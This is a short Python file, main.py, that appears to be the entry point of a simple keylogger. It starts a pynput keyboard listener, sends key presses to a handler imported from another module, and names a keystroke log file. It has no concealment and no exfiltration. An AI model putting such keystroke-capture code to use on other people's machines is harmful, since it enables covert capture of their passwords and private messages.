# main.py
from keypresses_enter import on_key_press
from pynput import keyboard

log_file = 'keystrokes_log.txt'

def main():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
